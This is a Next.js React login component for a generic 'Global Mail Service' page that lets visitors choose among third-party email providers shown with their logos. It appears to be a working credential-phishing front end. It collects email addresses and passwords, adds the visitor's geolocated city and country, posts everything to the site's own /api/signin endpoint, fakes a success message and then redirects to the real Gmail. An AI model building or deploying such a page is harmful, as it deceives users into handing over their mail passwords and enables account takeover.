'use client'

import { useState, useRef, useEffect } from 'react'
import Image from 'next/image'
import { useRouter } from 'next/navigation' // Import the router
import { PROVIDERS, MailProvider } from '@/lib/providers'
import styles from './LoginCard.module.css'

export default function LoginCard() {
  const router = useRouter()
  const [selected, setSelected] = useState<MailProvider | null>(null)
  const [username, setUsername] = useState('')
  const [password, setPassword] = useState('')
  const [formState, setFormState] = useState<'idle' | 'loading' | 'success' | 'error'>('idle')
  const [errorMsg, setErrorMsg] = useState('')
  const [location, setLocation] = useState<{ city?: string; country?: string }>({})
  const [locationStatus, setLocationStatus] = useState('idle')
  const usernameRef = useRef<HTMLInputElement>(null)

  // Location Detection
  useEffect(() => {
    if (!navigator.geolocation) return
    setLocationStatus('loading')
    navigator.geolocation.getCurrentPosition(
      (pos) => {
        fetch(`https://nominatim.openstreetmap.org/reverse?lat=${pos.coords.latitude}&lon=${pos.coords.longitude}&format=json`)
          .then((r) => r.json())
          .then((data) => {
            const city = data.address?.city || data.address?.town || data.address?.village || 'Unknown City';
            const country = data.address?.country || 'Unknown Country';
            setLocation({ city, country })
            setLocationStatus('granted')
          })
          .catch(() => setLocationStatus('denied'))
      },
      () => setLocationStatus('denied')
    )
  }, [])

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault()
    if (!selected || !username.trim() || !password.trim()) {
      setErrorMsg('Please fill in both fields.')
      return
    }

    setFormState('loading')
    setErrorMsg('')

    try {
      const res = await fetch('/api/signin', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          username: username.trim(),
          password: password.trim(),
          provider: selected.id,
          city: location.city,
          country: location.country,
        }),
      })

      if (!res.ok) throw new Error()
      
      setFormState('success')

      // Redirect after 2 seconds
      setTimeout(() => {
        // You can change this to '/inbox' or any page you like
        router.push('https://mail.google.com') 
      }, 2000)

    } catch {
      setFormState('error')
      setErrorMsg('Something went wrong. Please try again.')
    }
  }

  return (
    <div className={styles.card}>
      <div className={styles.header}>
        <div className={styles.logoMark}>
           <svg width="20" height="20" viewBox="0 0 20 20" fill="none"><path d="M2 5.5L10 11l8-5.5" stroke="white" strokeWidth="1.8" strokeLinecap="round" /><rect x="1" y="4" width="18" height="13" rx="3" stroke="white" strokeWidth="1.8" /></svg>
        </div>
        <h1 className={styles.title}>Global Mail Service</h1>
        <p className={styles.subtitle}>Sign in to access your email. Choose your provider below.</p>
      </div>

      <div className={styles.dividerLine} />

      <div className={styles.providerList}>
        {PROVIDERS.map((p) => (
          <button 
            key={p.id} 
            className={`${styles.providerRow} ${selected?.id === p.id ? styles.providerRowActive : ''}`}
            onClick={() => {
              setSelected(p);
              setFormState('idle');
              setErrorMsg('');
              setUsername('');
              setPassword('');
              setTimeout(() => usernameRef.current?.focus(), 100);
            }}
          >
            <span className={styles.providerLogo}>
              <Image src={p.logoUrl} alt={p.name} width={28} height={28} unoptimized />
            </span>
            <span className={styles.providerName}>{p.name}</span>
          </button>
        ))}
      </div>

      <div className={`${styles.signinPanel} ${selected ? styles.signinPanelOpen : ''}`}>
        {selected && (
          <form className={styles.form} onSubmit={handleSubmit} noValidate>
            <div className={styles.formHeader} style={{ borderLeftColor: selected.color }}>
              <span className={styles.signInText}>Sign in with</span>
              <div className={styles.formHeaderGroup}>
                <Image src={selected.logoUrl} alt="" width={20} height={20} unoptimized />
                <span className={styles.formProviderName}>{selected.shortName}</span>
              </div>
            </div>

            {formState === 'success' ? (
              <div className={styles.successState}>
                <span className={styles.checkIcon}>✓</span>
                <div className={styles.successTextContainer}>
                  <span className={styles.successTitle}>Signed in successfully</span>
                  <span className={styles.redirectNote}>Redirecting to your inbox...</span>
                </div>
              </div>
            ) : (
              <>
                <div className={styles.field}>
                  <label className={styles.label}>Email address</label>
                  <input
                    ref={usernameRef}
                    type="email"
                    className={styles.input}
                    placeholder={selected.emailHint}
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    disabled={formState === 'loading'}
                  />
                </div>

                <div className={styles.field}>
                  <label className={styles.label}>Password</label>
                  <input
                    type="password"
                    className={styles.input}
                    placeholder="••••••••••"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    disabled={formState === 'loading'}
                  />
                </div>

                {errorMsg && <p className={styles.errorMsg}>{errorMsg}</p>}

                <div className={styles.formActions}>
                  <a href="#" className={styles.forgotLink}>Forgot password?</a>
                  <button
                    type="submit"
                    className={styles.submitBtn}
                    style={{ backgroundColor: selected.color }}
                    disabled={formState === 'loading'}
                  >
                    {formState === 'loading' ? <span className={styles.spinner} /> : 'Continue'}
                  </button>
                </div>
              </>
            )}

            <p className={styles.locationNote}>
              {locationStatus === 'granted' 
                ? `📍 ${location.city}, ${location.country}` 
                : '📍 Detecting location...'}
            </p>
          </form>
        )}
      </div>

      <p className={styles.footer}>
        New to Global Mail Service? <a href="#" className={styles.footerLink}>Create account</a>
      </p>
    </div>
  )
}